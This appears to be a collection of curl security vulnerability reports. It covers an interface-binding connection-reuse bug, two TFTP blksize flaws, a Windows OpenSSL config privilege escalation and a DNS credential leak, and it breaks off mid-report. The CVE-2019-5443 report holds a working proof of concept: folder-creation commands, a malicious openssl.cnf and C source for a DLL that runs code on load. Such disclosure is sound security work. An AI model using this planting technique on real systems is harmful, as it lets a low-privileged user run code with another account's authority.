        self.end_headers()
        self.wfile.write(b)
socketserver.ThreadingTCPServer(("127.0.0.1", 18232), H).serve_forever()
```

1. The bug. The second transfer asks for 127.0.0.3 and goes out from 127.0.0.2:

```
curl -s -o /dev/null -w "local=%{local_ip} connects=%{num_connects}\n" --interface "host!127.0.0.2" http://127.0.0.1:18232/ --next -o /dev/null -w "local=%{local_ip} connects=%{num_connects}\n" --interface "host!127.0.0.3" http://127.0.0.1:18232/

local=127.0.0.2 connects=1
local=127.0.0.2 connects=0     <- this one asked for 127.0.0.3
```

2. Control. The same pair unprefixed is correct:

```
--interface "127.0.0.2"   then   --interface "127.0.0.3"

local=127.0.0.2 connects=1
local=127.0.0.3 connects=1
```

3. The same prefixed value twice still reuses, so putting it in the key costs no legitimate reuse:

```
--interface "host!127.0.0.2"   then   --interface "host!127.0.0.2"

local=127.0.0.2 connects=1
local=127.0.0.2 connects=0
```

4. The documented error is skipped. Make the second transfer `--interface "if!no-such-if-here"`: it reuses the warm connection and exits 0. The same option on its own, with no warm connection, correctly exits 45.

I have a minimal patch against efd42dfb that rebuilds the exact successful spelling, prefix included, into the existing `conn->localdev`, so the comparison and cleanup paths are untouched and no new per-connection pointers are added. It comes with a test asserting connects=1/connects=1/connects=0/, which fails on unpatched 8.22.0 at 1/0/0. Say the word and I will attach it or open an ordinary PR with no security framing.

## Impact

an application that gives different principals different source bindings while sharing a libcurl connection cache, for example per-tenant egress addresses or a source-IP ACL at the far end, a request configured for identity B goes out over identity A's already-bound socket and is treated as A. I tested that with a loopback server that accepts the protected request only from 127.0.0.2 and returns 403 otherwise: the transfer configured for `host!127.0.0.3` reused the .2 socket and got the success response, 3 runs out of 3, and with the patch it opened .3 and got 403, 3 runs out of 3. Where no such boundary exists the effect is narrower, the option is quietly ignored on reuse and the documented `if!` error never fires.

By curl's own wording I would put this at Medium, "a problem that usually needs something else to also happen to become serious", but Low is a fair call given how rarely the prefixed forms get used, and I will not argue it.

title: CVE-2019-5436: Heap Buffer Overflow at lib/tftp.c
body:
## Summary:
A heap buffer overflow can occur at line 1114 in file `lib/tftp.c` due to the fact of `state->blksize` containing the default size instead of containing the one specified in the `--tftp-blksize` parameter.

This bug could lead to a **crash** or maybe to **RCE** in the case the attacker also had a memory leak.


### Vulnerable line:
```
state->rbytes = (int)recvfrom(state->sockfd,
                                (void *)state->rpacket.data,
                                state->blksize + 4,
                                0,
                                (struct sockaddr *)&fromaddr,
                                &fromlen);
```


## Steps To Reproduce:

  1. Download the server script
  1. Run it and bind to an address: `$ python evil-server.py IP PORT`
  1. Connect to that server with curl: `$ curl --tftp-blksize N tftp://IP:PORT`
Where **N** should be a number lower than 293.

## Impact

* An attacker would also need a memory leak in order to gain full RCE.
* The victim should explicitly set the `--blksize` argument to a value inferior to 293.

Thus, the impact is not very high but it's still quite dangerous to not release a patch.

title: CVE-2019-5443: Windows Privilege Escalation: Malicious OpenSSL Engine
body:
## Summary:
The curl windows binaries are built with OpenSSL libraries and have an insecure path for the OPENSSLDIR build parameter. This path is set to c:\usr\local\ssl. When curl is executed it attempts to load openssl.cnf from this path. By default on windows, low privileged users have the authority to create folders under c:\. A low privileged user can create a custom openssl.cnf file to load a malicious OpenSSL Engine(library). The result is arbitrary code execution with the full authority of the account executing the curl binary.


Version tested.
curl-7.65.1_1-win64

OS:
Windows 10 

## Steps To Reproduce:
All steps are executed as a low privileged(non-admin) user unless otherwise noted

 1. As a low privileged user create the following folder c:\usr\local\ssl
```
mkdir c:\usr
mkdir c:\usr\local
mkdir c:\usr\local\ssl
```

 2. Create an openssl.cnf file with the following contents.

```
openssl_conf = openssl_init
[openssl_init]
engines = engine_section
[engine_section]
woot = woot_section
[woot_section]
engine_id = woot
dynamic_path = c:\\stage\\calc.dll
init = 0
```

 3. Create the c:\stage folder
```
mkdir c:\stage
````

 4. Create and compile a malicious OpenSSL Engine library. For this PoC we will execute the Windows calculator.
````
/* Cross Compile with
   x86_64-w64-mingw32-g++ calc.c -o calc.dll -shared
*/
#include <windows.h>
BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved )
{
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            system("calc");
            break;
        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;
        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;
        case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
```

 5. Copy calc.dll to c:\stage
`
copy calc.dll c:\stage
`
 6. Execute curl.exe as a different user.

## Supporting Material/References:
  * PoC image showing curl loading a custom calc.dll and executing calc.exe
{F507228}

## Impact

A malicious local user(or potentially malware) with access to a Windows workstation or server with curl installed has the ability to silently plant a custom OpenSSL Engine library that contains arbitrary code. Every time curl is executed this library will be loaded and the code executed with the full authority of the account executing it resulting in the elevation of privileges.

title: CVE-2019-5482: Heap buffer overflow in TFTP when using small blksize
body:
## Summary:
With a TFTP server that does not send OACK, but instead starts anyway with first block with 512 bytes block size, the curl library fails to assume default 512 bytes blocks. Instead it detects EOF and does not return an error code. Consequence is a truncated file that is 512 bytes without any error code.

My understanding is that from the RFC, a TFTP server might ignore blksize request and anyway send the default 512 bytes block size data.

Unless an OACK is received we should assume 512 block size, whether or not a particular blocksize was requested.

This was introduced by security fix of CVE-2019-5436:
257600341 tftp: use the current blksize for recvfrom()

## Potential Fix
We could revert 2576003415625d7b5f0e390902f8097830b82275 and instead malloc the receive buffer for at least 512 bytes, or for the requested blksize if it is bigger. That would address the issue being reported and also the CVE-2019-5436.

## Steps To Reproduce:
  1. Use a TFTP server that does not send OACK in response of a particular blksize request, but instead sends directly the first block, of default size (512B).
  2. Run curl asking for a >512 bytes block size like:
    curl --tftp-blksize 8192 tftp://9.1.9.1/data.bin --output data.bin
  3. echo $? is 0 and file size is 512 bytes

## Comment
Not too sure about the Weakness identification and/or Severity, reporting it here since it was introduced by a CVE fix.

## Impact

File truncation without 'curl' returning any error code.

title: CVE-2020-8169: Partial password leak over DNS on HTTP redirect
body:
## Summary:
From version 7.62 curl and curllib leaks part of user credentials in the plain text DNS request. This happens if the server makes redirect, both 301 and 302 to a relative path (eg header 'Location: /login'). It is NOT an issue in case of absolute redirection (eg header 'Location: https://domain.tld/login').
I was able to make curl/curlib to send a password that started with @ but I believe that more abuse is possible with this attack. 
What makes is worst is that for eg occasionally run/daemon scripts with curl and authorization credentials this can be triggered by a remote server by switching between absolute/relative without any change on client-side.
User secrets are sent in plain text and anybody in the middle can record them. User secrets are sent to the DNS server and can be recorded there.

## Steps To Reproduce:

  1. Use curl > 7.61 (tested on all from 7.62 to 7.70 and I was able to exploit it)
  1. Find a server with relative redirection (eg https://mareksz.gq/301 or https://mareksz.gq/302)
  1. Run 'curl https://mareksz.gq/302 -v -L -u saduser:@S3cr3t'

## Supporting Material/References:
Logs from running above steps:
